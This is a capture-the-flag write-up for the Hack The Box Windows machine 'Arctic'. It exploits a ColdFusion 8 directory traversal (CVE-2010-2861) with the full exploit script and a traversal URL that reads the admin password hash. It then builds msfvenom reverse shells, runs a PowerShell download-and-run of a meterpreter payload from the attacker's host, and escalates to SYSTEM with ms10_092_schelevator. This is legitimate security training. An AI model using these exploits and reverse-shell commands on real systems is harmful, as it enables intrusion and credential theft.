# Arctic-HTB
Arctic is a Windows machine that is rated as easy. In this box we will explore ColdFusion webserver, so let's start :)
# Recon
I started by runing nmap scan on the box.
```
┌──(kali㉿kali)-[~/Desktop]
└─$ nmap -sC -sV -Pn 10.10.10.11
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-31 14:11 EDT
Nmap scan report for 10.10.10.11
Host is up (0.026s latency).
Not shown: 997 filtered ports
PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  fmtp?
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 140.25 seconds
```
So I searched for port 8500 and found that it is a ColdFusion webserver. Here is a usful refrence https://www.speedguide.net/port.php?port=8500

If we visit it you will see these directories:
![image1]()

And then if we go here: http://10.10.10.11:8500/CFIDE/administrator/ we will see that the webserver version is ```Adobe Coldfusion 8```. let's try search for exploitaion.
```
┌──(kali㉿kali)-[~/Desktop]
└─$ searchsploit Adobe Coldfusion 8
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                           |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Adobe ColdFusion - Directory Traversal                                                                                                                                                                   | multiple/remote/14641.py
Adobe ColdFusion - Directory Traversal (Metasploit)                                                                                                                                                      | multiple/remote/16985.rb
```
# User Flag
If we look at the first one we can see that the code is performing a GET request on http://server/CFIDE/administrator/enter.cfm with ```local``` parameter.
```
┌──(kali㉿kali)-[~/Desktop]
└─$ cat /usr/share/exploitdb/exploits/multiple/remote/14641.py 
# Working GET request courtesy of carnal0wnage:
# http://server/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en
#
# LLsecurity added another admin page filename: "/CFIDE/administrator/enter.cfm"


#!/usr/bin/python

# CVE-2010-2861 - Adobe ColdFusion Unspecified Directory Traversal Vulnerability
# detailed information about the exploitation of this vulnerability:
# http://www.gnucitizen.org/blog/coldfusion-directory-traversal-faq-cve-2010-2861/

# leo 13.08.2010

import sys
import socket
import re

# in case some directories are blocked
filenames = ("/CFIDE/wizards/common/_logintowizard.cfm", "/CFIDE/administrator/archives/index.cfm", "/cfide/install.cfm", "/CFIDE/administrator/entman/index.cfm", "/CFIDE/administrator/enter.cfm")

post = """POST %s HTTP/1.1
Host: %s
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: %d

locale=%%00%s%%00a"""

def main():
    if len(sys.argv) != 4:
        print "usage: %s <host> <port> <file_path>" % sys.argv[0]
        print "example: %s localhost 80 ../../../../../../../lib/password.properties" % sys.argv[0]
        print "if successful, the file will be printed"
        return
    
    host = sys.argv[1]
    port = sys.argv[2]
    path = sys.argv[3]

    for f in filenames:
        print "------------------------------"
        print "trying", f

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, int(port)))
        s.send(post % (f, host, len(path) + 14, path))

        buf = ""
        while 1:
            buf_s = s.recv(1024)
            if len(buf_s) == 0:
                break
            buf += buf_s
       
        m = re.search('<title>(.*)</title>', buf, re.S)
        if m != None:
            title = m.groups(0)[0]
            print "title from server in %s:" % f
            print "------------------------------"
            print m.groups(0)[0]
            print "------------------------------"

if __name__ == '__main__':
    main()
 ```
 Also it looks like there is password stored at ```password.properties```, so we can grab it by visiting: ```http://10.10.10.11:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en```

Here it is:

![image2]()

So if we use ```hash-identifier``` we can see that the hash is SHA-1:
```
kali@kali:~/Desktop$ hash-identifier 
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: 2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03

Possible Hashs:
[+] SHA-1
```
We can use https://crackstation.net/ to get the password:

![image3]()

So the password is ```happyday```, we can use it now to login. Note: The user is ```admin```.

Let's now generate our shell:
```
┌──(kali㉿kali)-[~/Desktop/HTB/Arctic]
└─$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.28 LPORT=4444 > Z0ldyck.jsp
Payload size: 1497 bytes
```

Let's scheduled our task by going here:

![image4]()

And then click on ```Schedul New Task```, you should get somthing like this:

![image5]()

So let's fill:

![image6]()

For the ```File``` section here is what I put: ```C:\ColdFusion8\wwwroot\CFIDE\Z0ldyck.jsp```. Also I started a webserver on that directory.

So we can now run our task:

![image7]()

After you run your task you should see your reverse shell here ```http://10.10.10.11:8500/CFIDE/```

![image8]()

If you click on it you will get a shell:
```
┌──(kali㉿kali)-[~/Desktop]
└─$ nc -nlvp 4444                        
listening on [any] 4444 ...
connect to [10.10.14.28] from (UNKNOWN) [10.10.10.11] 49525
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\ColdFusion8\runtime\bin>whoami
whoami
arctic\tolis
```
We can now get User Flag:
```
C:\Users\tolis\Desktop>type user.txt
type user.txt
02650d3a...a6cb96f3
```
# Root Flag
Let's generate a new payload, but this time to get a meterpreter reverse shell:
```
┌──(kali㉿kali)-[~/Desktop/HTB/Arctic]
└─$ msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.14.28 lport=5555 -f exe > meterpreter.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 341 bytes
Final size of exe file: 73802 bytes
```
Make sure to run a web server on the payload directory. Note: you can run a webserver by using this command: ```python3 -m http.server --bind <your_ip_address>```

Let's setup Metasploit now:
```
msf5 > use exploit/multi/handler
msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > options 

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.28      yes       The listen address (an interface may be specified)
   LPORT     5555             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target
```
And make sure to run it.

Now in our reverse shell run this command to get the payload ```powershell "(new-object System.Net.WebClient).Downloadfile('http://10.10.14.28:8000/meterpreter.exe', 'meterpreter.exe')"```

```
C:\Users\tolis\Desktop>powershell "(new-object System.Net.WebClient).Downloadfile('http://10.10.14.28:8000/meterpreter.exe', 'meterpreter.exe')"
powershell "(new-object System.Net.WebClient).Downloadfile('http://10.10.14.28:8000/meterpreter.exe', 'meterpreter.exe')"


C:\Users\tolis\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is F88F-4EA5

 Directory of C:\Users\tolis\Desktop

02/09/2020  06:49 ��    <DIR>          .
02/09/2020  06:49 ��    <DIR>          ..
02/09/2020  06:49 ��            73.802 meterpreter.exe
22/03/2017  10:01 ��                32 user.txt
               2 File(s)         73.834 bytes
               2 Dir(s)  33.183.948.800 bytes free

C:\Users\tolis\Desktop>
```
So let's run it now:
```
C:\Users\tolis\Desktop>.\meterpreter.exe
.\meterpreter.exe
```
And you should get your meterpreter reverse shell:
```
msf5 exploit(multi/handler) > exploit 

[*] Started reverse TCP handler on 10.10.14.28:5555 
[*] Sending stage (176195 bytes) to 10.10.10.11
[*] Meterpreter session 1 opened (10.10.14.28:5555 -> 10.10.10.11:49586) at 2020-08-31 15:51:41 -0400

meterpreter >
```
By running ```local_exploit_suggester``` we can see that the box is vulnerable to ```ms10_092_schelevator```.
```
meterpreter > run post/multi/recon/local_exploit_suggester

[*] 10.10.10.11 - Collecting local exploits for x86/windows...
[*] 10.10.10.11 - 34 exploit checks are being tried...
[+] 10.10.10.11 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
nil versions are discouraged and will be deprecated in Rubygems 4
[+] 10.10.10.11 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.10.10.11 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.10.10.11 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.11 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.11 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.11 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
[+] 10.10.10.11 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.10.10.11 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
```
So we can exploit it and get a ```SYSTEM``` user.
```
meterpreter > background 
[*] Backgrounding session 1...
msf5 exploit(multi/handler) > use exploit/windows/local/ms10_092_schelevator
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf5 exploit(windows/local/ms10_092_schelevator) > options

Module options (exploit/windows/local/ms10_092_schelevator):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   CMD                        no        Command to execute instead of a payload
   SESSION   1                yes       The session to run this module on.
   TASKNAME                   no        A name for the created task (default random)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.28      yes       The listen address (an interface may be specified)
   LPORT     7777             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows Vista, 7, and 2008
```
And by running it we get this error:
```
[-] Exploit aborted due to failure: no-target: Running against via WOW64 is not supported, try using an x64 meterpreter...
```
So we need to migrate to a x64 process. We can do that by looking at the running process:
```
meterpreter > ps

Process List
============

 PID   PPID  Name                     Arch  Session  User          Path
 ---   ----  ----                     ----  -------  ----          ----
 0     0     [System Process]                                      
 4     0     System                                                
 236   4     smss.exe                                              
 328   308   csrss.exe                                             
 340   480   svchost.exe                                           
 372   308   wininit.exe                                           
 392   380   csrss.exe                                             
 396   480   spoolsv.exe                                           
 436   380   winlogon.exe                                          
 480   372   services.exe                                          
 492   372   lsass.exe                                             
 500   372   lsm.exe                                               
 596   3528  cmd.exe                  x86   0        ARCTIC\tolis  C:\Windows\SysWOW64\cmd.exe
 604   480   svchost.exe                                           
 676   480   svchost.exe                                           
 752   436   LogonUI.exe                                           
 760   480   svchost.exe                                           
 800   480   svchost.exe                                           
 848   480   svchost.exe                                           
 904   480   svchost.exe                                           
 944   480   svchost.exe                                           
 1040  480   CF8DotNetsvc.exe                                      
 1092  1040  JNBDotNetSide.exe                                     
 1100  328   conhost.exe                                           
 1148  480   jrunsvc.exe              x64   0        ARCTIC\tolis  C:\ColdFusion8\runtime\bin\jrunsvc.exe
 1176  1148  jrun.exe                 x64   0        ARCTIC\tolis  C:\ColdFusion8\runtime\bin\jrun.exe
 1184  480   swagent.exe                                           
 1192  328   conhost.exe              x64   0        ARCTIC\tolis  C:\Windows\System32\conhost.exe
 1228  480   swstrtr.exe                                           
 1236  1228  swsoc.exe                                             
 1244  328   conhost.exe                                           
 1332  480   k2admin.exe                                           
 1432  604   WmiPrvSE.exe                                          
 1456  480   svchost.exe                                           
 1488  480   VGAuthService.exe                                     
 1752  480   vmtoolsd.exe                                          
 1776  480   ManagementAgentHost.exe                               
 2208  1332  k2server.exe                                          
 2216  328   conhost.exe                                           
 2260  1332  k2index.exe                                           
 2440  328   conhost.exe                                           
 2956  480   svchost.exe                                           
 2976  328   conhost.exe              x64   0        ARCTIC\tolis  C:\Windows\System32\conhost.exe
 3032  480   dllhost.exe                                           
 3192  480   msdtc.exe                                             
 3288  1176  cmd.exe                  x64   0        ARCTIC\tolis  C:\Windows\System32\cmd.exe
 3444  328   conhost.exe              x64   0        ARCTIC\tolis  C:\Windows\System32\conhost.exe
 3528  3288  meterpreter.exe          x86   0        ARCTIC\tolis  C:\Users\tolis\Desktop\meterpreter.exe
 3836  480   sppsvc.exe
 ```
 We can migrate to ```jrunsvc.exe```
 
```
meterpreter > migrate 1148
[*] Migrating from 3528 to 1148...
[*] Migration completed successfully.
```
Note ```1148``` is the PID of ```jrunsvc.exe```.

So if we go back and exploit ```ms10_092_schelevator``` we will get a shell as ```SYSTEM```:
```
msf5 exploit(windows/local/ms10_092_schelevator) > exploit 

[*] Started reverse TCP handler on 10.10.14.28:7777 
[*] Preparing payload at C:\Users\tolis\AppData\Local\Temp\pIxwhXBQ.exe
[*] Creating task: AUUAvXtw4
[*] SUCCESS: The scheduled task "AUUAvXtw4" has successfully been created.
[*] SCHELEVATOR
[*] Reading the task file contents from C:\Windows\system32\tasks\AUUAvXtw4...
[*] Original CRC32: 0x4ce88f4f
[*] Final CRC32: 0x4ce88f4f
[*] Writing our modified content back...
[*] Validating task: AUUAvXtw4
[*] 
[*] Folder: \
[*] TaskName                                 Next Run Time          Status         
[*] ======================================== ====================== ===============
[*] AUUAvXtw4                                1/10/2020 7:05:00 ��   Ready          
[*] SCHELEVATOR
[*] Disabling the task...
[*] SUCCESS: The parameters of scheduled task "AUUAvXtw4" have been changed.
[*] SCHELEVATOR
[*] Enabling the task...
[*] SUCCESS: The parameters of scheduled task "AUUAvXtw4" have been changed.
[*] SCHELEVATOR
[*] Executing the task...
[*] Sending stage (176195 bytes) to 10.10.10.11
[*] SUCCESS: Attempted to run the scheduled task "AUUAvXtw4".
[*] SCHELEVATOR
[*] Deleting the task...
[*] Meterpreter session 2 opened (10.10.14.28:7777 -> 10.10.10.11:49639) at 2020-08-31 16:05:07 -0400
[*] SUCCESS: The scheduled task "AUUAvXtw4" was successfully deleted.
[*] SCHELEVATOR

meterpreter > getuid 
Server username: NT AUTHORITY\SYSTEM
```
Let's drop a shell and get the Root Flag:
```
meterpreter > shell 
Process 3172 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\Administrator>cd Desktop

C:\Users\Administrator\Desktop>type root.txt
type root.txt
ce65cee...08ffb90
```
Thank you for reading, and you can find me here on twitter: https://twitter.com/electronicbots
